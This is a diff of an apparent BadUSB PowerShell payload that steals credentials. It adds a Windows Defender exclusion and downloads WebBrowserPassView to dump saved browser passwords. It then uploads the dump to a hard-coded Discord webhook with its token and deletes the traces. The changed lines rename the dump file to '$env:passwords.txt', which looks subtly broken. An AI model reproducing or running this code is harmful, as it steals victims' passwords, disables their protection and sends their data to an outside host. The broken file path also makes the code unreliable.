@@ -4,7 +4,7 @@ Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents' # Disabling antiviru
 
 Invoke-WebRequest https://github.com/arpanghosh8453/badusb/blob/main/binary/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
 
-.\WebBrowserPassView.exe /stext $env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt #Create the file for Browser passwords
+.\WebBrowserPassView.exe /stext $env:TEMP/$env:passwords.txt #Create the file for Browser passwords
 
 Start-Sleep -Seconds 10
 
@@ -27,7 +27,7 @@ param (
 )
 $dc = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC"
 $hookurl = "$dc"
-$file = "$dir\$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt"
+$file = "$dir\$env:passwords.txt"
 $Body = @{
   'username' = $env:username
   'content' = $text
@@ -38,7 +38,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/$env:passwords.txt"}
 
 #curl.exe -F "payload_json={\`"username\`": \`"$env:ComputerName\`", \`"content\`": \`"New File Uploaded`!\n(Admin: $Admin) \`"}" -F "file=@\`"$log\`"" $hookurl >$null 2>&1
 
@@ -63,7 +63,7 @@ function Clean-Exfil {
 
 ############################################################################################################################################################
 
-RI $env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt
+RI $env:TEMP/$env:passwords.txt
 
 if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 
